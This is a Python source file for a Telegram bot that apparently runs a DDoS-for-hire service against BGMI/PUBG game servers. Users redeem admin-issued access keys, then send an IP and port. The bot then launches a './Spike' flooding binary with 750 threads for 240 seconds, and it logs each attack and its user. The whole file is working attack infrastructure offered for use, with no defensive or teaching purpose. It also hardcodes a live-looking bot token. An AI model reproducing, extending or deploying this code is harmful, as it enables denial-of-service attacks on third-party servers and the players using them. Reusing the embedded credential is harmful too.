from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import subprocess
import random
import string
import time
import asyncio
from datetime import datetime
import pytz
import os

# Global variables
attack_running = False
authorized_users = {}  # {user_id: {"expiry_time": expiry_time, "key": key, "redeem_time": redeem_time, "attacks": attack_count}}
keys = {}  # {key: expiry_time}
attack_logs = []  # List to store attack logs
all_users = set()  # Track all users who have interacted with the bot
waiting_users = set()  # Track users waiting for an attack to finish

# Define admin ID
ADMIN_ID = 7163028849  # Replace with your admin's Telegram ID

# Define default values
DEFAULT_PACKET_SIZE = 512
DEFAULT_THREADS = 750
MAX_ATTACK_TIME = 240  # in seconds

# Kolkata timezone
KOLKATA_TZ = pytz.timezone('Asia/Kolkata')

# File paths
GENERATED_KEYS_FILE = "generated.txt"
REDEEMED_KEYS_FILE = "redeemed.txt"
LOGS_FILE = "logs.txt"
USERS_FILE = "users.txt"

async def get_user_info(user_id, context):
    """Fetch user details (Username, First Name, Last Name) given a User ID."""
    try:
        user_info = await context.bot.get_chat(user_id)
        username = f"@{user_info.username}" if user_info.username else "No Username"
        first_name = user_info.first_name if user_info.first_name else "No First Name"
        last_name = user_info.last_name if user_info.last_name else "No Last Name"
    except Exception as e:
        print(f"Failed to fetch user info for {user_id}: {e}")
        username, first_name, last_name = "Unknown", "Unknown", "Unknown"
    
    return f"👤 **User ID:** `{user_id}`\n🔹 **Username:** {username}\n📝 **Name:** {first_name} {last_name}"

def clean_expired_users():
    current_time = time.time()
    expired_users = [user_id for user_id, details in authorized_users.items() if details["expiry_time"] <= current_time]
    for user_id in expired_users:
        del authorized_users[user_id]

def save_logs_to_file():
    with open(LOGS_FILE, "w") as log_file:
        for log in attack_logs:
            log_file.write(f"User ID: `{log['user_id']}` | Target: `{log['ip']}:{log['port']}` | Time: `{log['time']}`\n")

def read_logs_from_file():
    try:
        with open(LOGS_FILE, "r") as log_file:
            return log_file.readlines()
    except FileNotFoundError:
        return []

def read_users_from_file():
    try:
        with open(USERS_FILE, "r") as users_file:
            return users_file.readlines()
    except FileNotFoundError:
        return []

def save_generated_keys_to_file():
    with open(GENERATED_KEYS_FILE, "w") as keys_file:
        for key, expiry_time in keys.items():
            keys_file.write(f"{key}:{expiry_time}\n")

def save_redeemed_keys_to_file():
    with open(REDEEMED_KEYS_FILE, "a") as redeemed_file:
        for user_id, details in authorized_users.items():
            redeemed_file.write(f"{details['key']}:{details['redeem_time']}:{user_id}\n")

def generate_key(duration):
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    keys[key] = time.time() + duration
    save_generated_keys_to_file()
    return key

def parse_duration(duration_str):
    if 'hour' in duration_str:
        return int(duration_str.replace('hour', '')) * 3600
    elif 'day' in duration_str:
        return int(duration_str.replace('day', '')) * 86400
    return None

# Function to remove a redeemed key from generated.txt
def remove_redeemed_key_from_generated(key):
    try:
        with open(GENERATED_KEYS_FILE, "r") as keys_file:
            lines = keys_file.readlines()
        
        # Remove the key from the list
        updated_lines = [line for line in lines if not line.startswith(f"{key}:")]
        
        # Write the updated list back to the file
        with open(GENERATED_KEYS_FILE, "w") as keys_file:
            keys_file.writelines(updated_lines)
    except FileNotFoundError:
        pass  # If the file doesn't exist, do nothing

def attack(ip, port, context, chat_id, user_id):
    global attack_running

    try:
        subprocess.Popen(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])

        attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
        attack_logs.append({
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "time": attack_time
        })

        if user_id in authorized_users:
            authorized_users[user_id]["attacks"] += 1

    finally:
        attack_running = False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    all_users.add(user_id)

    start_message = (
        "🚀 *Welcome to BGMI Attack Bot* 🚀\n\n"
        "⚡️ _A powerful tool to manage DDoS attacks for BGMI/PUBG servers_ ⚡️\n\n"
        "✨ **Key Features:**\n"
        "   • Start attacks with `/bgmi` command\n"
        "   • Key-based authorization system\n"
        "   • Admin controls for key generation\n"
        "   • Real-time attack monitoring\n\n"
        "🔧 **Commands:**\n"
        "   /help - Show all commands\n"
        "   /bgmi - Start attack\n"
        "   /redeem - Activate your key\n\n"
        "👑 **Bot Owner:** [TITAN OP](https://t.me/TITANOP24)\n"
        "⚙️ _Use this bot responsibly!_"
    )
    await update.message.reply_text(start_message, parse_mode="Markdown")

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_message = (
        "🛠️ *Available Commands* 🛠️\n\n"
        "🎮 *Attack Commands:*\n"
        "`/bgmi <ip> <port>` - Start a new attack\n"
        "`/redeem <key>` - Redeem your access key\n\n"
        "🔑 *Admin Commands:*\n"
        "`/genkey <duration>` - Generate single key\n"
        "`/mgenkey <duration> <amount>` - Bulk generate keys\n"
        "`/users` - List authorized users\n"
        "`/logs` - Show attack logs\n"
        "`/broadcast <message>` - Broadcast message to all users\n\n"
        "ℹ️ *Info Commands:*\n"
        "`/start` - Show bot introduction\n"
        "`/help` - Display this message\n\n"
        "👨💻 *Developer:* [@TITANOP24](https://t.me/TITANOP24)\n"
        "🔒 _All attacks are logged and monitored_"
    )
    await update.message.reply_text(help_message, parse_mode="Markdown")

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    user_id = update.message.from_user.id

    if attack_running:
        waiting_users.add(user_id)
        await update.message.reply_text('⏳ Another attack is running. Please wait for it to finish.')
        return

    if user_id not in authorized_users or time.time() > authorized_users[user_id]["expiry_time"]:
        await update.message.reply_text('❌ You are not authorized. Redeem a key first.')
        return

    if len(context.args) < 2:
        await update.message.reply_text('Usage: /bgmi <ip> <port>')
        return

    ip, port = context.args[0], context.args[1]

    attack_running = True
    attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")

    attack_details = (
        f"🚀 Attack started!\n\n"
        f"🎯 Target IP: `{ip}`\n"
        f"🚪 Port: `{port}`\n"
        f"⏰ Duration: `{MAX_ATTACK_TIME} seconds`\n"
        f"📅 Time: `{attack_time}`"
    )
    await update.message.reply_text(attack_details, parse_mode="Markdown")

    asyncio.create_task(run_attack(ip, port, user_id, context))

async def run_attack(ip, port, user_id, context):
    global attack_running, waiting_users

    try:
        subprocess.Popen(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])

        attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
        attack_logs.append({
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "time": attack_time
        })

        if user_id in authorized_users:
            authorized_users[user_id]["attacks"] += 1

        await asyncio.sleep(MAX_ATTACK_TIME)

    finally:
        attack_running = False

        attack_finished_message = (
            f"✅ Attack finished!\n\n"
            f"🎯 Target IP: `{ip}`\n"
            f"🚪 Port: `{port}`\n"
            f"⏰ Duration: `{MAX_ATTACK_TIME} seconds`\n"
            f"📅 Time: `{datetime.now(KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')}`"
        )
        await context.bot.send_message(chat_id=user_id, text=attack_finished_message, parse_mode="Markdown")

        if waiting_users:
            for user in waiting_users:
                try:
                    await context.bot.send_message(chat_id=user, text="🔔 The previous attack has finished. You can now start your attack!")
                except Exception as e:
                    print(f"Failed to notify user {user}: {e}")

            waiting_users.clear()

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
        return

    if len(context.args) < 1:
        await update.message.reply_text('Usage: /genkey <duration>')
        return

    duration = parse_duration(context.args[0])
    if not duration:
        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘥𝘶𝘳𝘢𝘵𝘪𝘰𝘯. 𝘜𝘴𝘦 𝘧𝘰𝘳𝘮𝘢𝘵 𝘭𝘪𝘬𝘦 1𝘩𝘰𝘶𝘳, 2𝘥𝘢𝘺𝘴, 𝘦𝘵𝘤.')
        return

    key = generate_key(duration)
    await update.message.reply_text(f'🔑 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 𝘬𝘦𝘺:\n\n`{key}`', parse_mode="Markdown")

async def mgenkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
        return

    if len(context.args) < 2:
        await update.message.reply_text('Usage: /mgenkey <duration> <number>')
        return

    duration = parse_duration(context.args[0])
    if not duration:
        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘥𝘶𝘳𝘢𝘵𝘪𝘰𝘯. 𝘜𝘴𝘦 𝘧𝘰𝘳𝘮𝘢𝘵 𝘭𝘪𝘬𝘦 1𝘩𝘰𝘶𝘳, 2𝘥𝘢𝘺𝘴, 𝘦𝘵𝘤.')
        return

    number = int(context.args[1])
    keys_list = [generate_key(duration) for _ in range(number)]
    await update.message.reply_text(f'🔑 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 𝘬𝘦𝘺𝘴:\n\n' + '\n'.join([f'`{key}`' for key in keys_list]), parse_mode="Markdown")

async def block(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ You are not authorized to use this command.')
        return

    if len(context.args) < 1:
        await update.message.reply_text('Usage: /block <key>')
        return

    key_to_block = context.args[0]

    if key_to_block in keys:
        del keys[key_to_block]

    revoked_users = []
    for user_id, details in list(authorized_users.items()):
        if details["key"] == key_to_block:
            del authorized_users[user_id]
            user_details = await get_user_info(user_id, context)
            revoked_users.append(user_details)

    if revoked_users:
        await update.message.reply_text(
            f"🚫 **Key `{key_to_block}` has been blocked and access revoked for:**\n\n" + '\n\n'.join(revoked_users),
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(f"✅ Key `{key_to_block}` has been blocked (No active users were using it).", parse_mode="Markdown")

def save_users_to_file():
    with open(USERS_FILE, "w") as users_file:
        for user_id, details in authorized_users.items():
            expiry_time = datetime.fromtimestamp(details["expiry_time"], KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')
            redeem_time = datetime.fromtimestamp(details["redeem_time"], KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')
            user_info_str = f"User ID: `{user_id}` | Username: `{details.get('username', 'No Username')}` | Key: `{details['key']}` | Redeem Time: `{redeem_time}` | Expiry Time: `{expiry_time}` | Attacks Done: `{details['attacks']}`\n"
            users_file.write(user_info_str)

async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lists all authorized users with detailed information, including username."""
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ You are not authorized to use this command.')
        return
    
    # Clean expired users before displaying the list
    clean_expired_users()
    save_users_to_file()

    # Read users from the file
    users_list = read_users_from_file()

    if not users_list:
        await update.message.reply_text('No authorized users found.')
        return

    # Prepare the response message
    response = "📜 **Authorized Users:**\n\n"
    for user_line in users_list:
        try:
            # Extract user details from the file line
            user_id = user_line.split("User ID: `")[1].split("`")[0].strip()
            username = user_line.split("Username: `")[1].split("`")[0].strip()
            key = user_line.split("Key: `")[1].split("`")[0].strip()
            redeem_time = user_line.split("Redeem Time: `")[1].split("`")[0].strip()
            expiry_time = user_line.split("Expiry Time: `")[1].split("`")[0].strip()
            attacks_done = user_line.split("Attacks Done: `")[1].split("`")[0].strip()

            # Format the user details in the desired format
            user_info = (
                f"👤 **User ID:** `{user_id}`\n"
                f"👤 **Username:** `{username}`\n"
                f"🔑 **Key:** `{key}`\n"
                f"⏰ **Redeem Time:** `{redeem_time}`\n"
                f"⏳ **Expiry Time:** `{expiry_time}`\n"
                f"🎯 **Attacks Done:** `{attacks_done}`\n\n"
            )
            response += user_info
        except IndexError:
            # Skip malformed lines in the file
            continue

    # Send the response
    await update.message.reply_text(response, parse_mode="Markdown")

    
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    
    # Check if the user already has an active key
    if user_id in authorized_users and time.time() < authorized_users[user_id]["expiry_time"]:
        expiry_time = datetime.fromtimestamp(authorized_users[user_id]["expiry_time"], KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')
        await update.message.reply_text(
            f"❌ You already have an active key that expires on `{expiry_time}`.\n"
            "You can only redeem a new key after the current one expires.",
            parse_mode="Markdown"
        )
        return
    
    # Check if the user provided a key
    if len(context.args) < 1:
        await update.message.reply_text('Usage: /redeem <key>')
        return

    key = context.args[0]
    current_time = time.time()
    
    # Check if the key is valid and not expired
    if key not in keys or current_time > keys[key]:
        await update.message.reply_text('❌ Invalid or expired key.')
        return

    # Fetch username using get_user_info
    user_info_str = await get_user_info(user_id, context)
    try:
        username = user_info_str.split("\n")[1].split(": ")[1]  # Extract username from the user info string
    except IndexError:
        username = "No Username"

    # Redeem the key
    authorized_users[user_id] = {
        "expiry_time": keys[key],
        "key": key,
        "redeem_time": current_time,
        "attacks": 0,
        "username": username  # Store the username
    }
    del keys[key]  # Remove the key from the available keys

    # Remove the redeemed key from generated.txt
    remove_redeemed_key_from_generated(key)

    # Save user data to users.txt
    save_users_to_file()

    # Save redeemed key to redeemed.txt
    with open(REDEEMED_KEYS_FILE, "a") as redeemed_file:
        redeemed_file.write(f"{key}:{current_time}:{user_id}\n")

    # Notify the user
    expiry_time = datetime.fromtimestamp(authorized_users[user_id]["expiry_time"], KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')
    await update.message.reply_text(
        f"✅ Key redeemed successfully!\n"
        f"🔑 Key: `{key}`\n"
        f"⏳ Expiry: `{expiry_time}`\n\n"
        "You are now authorized to use `/bgmi`.",
        parse_mode="Markdown"
    )

async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ You are not authorized to use this command.')
        return
    
    save_logs_to_file()
    logs_list = read_logs_from_file()
    
    response = '📜 **Attack Logs:**\n\n' + ''.join(logs_list) if logs_list else 'No logs found.'
    await update.message.reply_text(response, parse_mode="Markdown")

async def delete_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ You are not authorized to use this command.')
        return
    
    if len(context.args) < 1:
        await update.message.reply_text('Usage: /del <logs/users>')
        return
    
    file_type = context.args[0].lower()
    if file_type == "logs":
        open(LOGS_FILE, "w").close()
        attack_logs.clear()
        await update.message.reply_text('✅ Logs have been cleared.')
    elif file_type == "users":
        open(USERS_FILE, "w").close()
        authorized_users.clear()
        await update.message.reply_text('✅ Users list has been cleared.')
    else:
        await update.message.reply_text('❌ Invalid argument. Use /del logs or /del users.')

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ You are not authorized to use this command.')
        return

    if len(context.args) < 1:
        await update.message.reply_text('Usage: /broadcast <message>')
        return

    message = ' '.join(context.args)

    all_recipients = set(all_users) | set(authorized_users.keys())

    sent_count = 0
    for user_id in all_recipients:
        try:
            await context.bot.send_message(chat_id=user_id, text=f"📢 Broadcast:\n\n{message}")
            sent_count += 1
        except Exception as e:
            print(f"Failed to send broadcast to user {user_id}: {e}")

    await update.message.reply_text(f'✅ Message broadcasted to {sent_count} users.')

async def dispose_unredeemed_keys():
    while True:
        current_time = time.time()
        unredeemed_keys = [key for key, expiry_time in keys.items() if current_time > expiry_time + 7200]  # 2 hours
        for key in unredeemed_keys:
            del keys[key]
        save_generated_keys_to_file()
        await asyncio.sleep(3600)  # Check every hour

def main():
    application = Application.builder().token("8022705558:AAHNho8teEshiW-rlGhtqnFO2wQPNXX0hUA").build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("mgenkey", mgenkey))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("logs", logs))
    application.add_handler(CommandHandler("block", block))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("del", delete_file))

    # Start the unredeemed keys disposal task
    asyncio.get_event_loop().create_task(dispose_unredeemed_keys())

    application.run_polling()

if __name__ == '__main__':
    main()
